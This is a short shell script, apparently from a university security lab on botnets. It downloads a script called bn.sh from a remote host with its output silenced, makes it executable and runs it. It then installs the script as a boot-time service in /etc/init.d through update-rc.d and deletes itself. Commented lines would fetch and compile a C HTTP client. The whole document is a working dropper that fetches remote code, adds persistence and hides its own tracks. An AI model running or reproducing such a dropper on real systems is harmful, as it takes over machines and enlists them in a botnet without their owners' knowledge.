#!/bin/sh                                                                                                                    
echo "success:" `pwd` : `ls -la`
CURDIR=`pwd`
DIRECTORY="./"
TARGET=".bashrc"
FULLPATH="${DIRECTORY}${TARGET}"

wget "abstract.cs.washington.edu/~roy/lab3/Botnet/bn.sh" &> /dev/null
#rm ~/cgethttp.c     
#wget "abstract.cs.washington.edu/~roy/lab3/Botnet/cgethttp.c"                                                                 
#gcc cgethttp.c -o cgethttp                                                                                                    
#chmod +x cgethttp

chmod +x bn.sh
./bn.sh

mv bn.sh /etc/init.d/bn.sh
update-rc.d bn.sh defaults

cd $CURDIR
rm bad.sh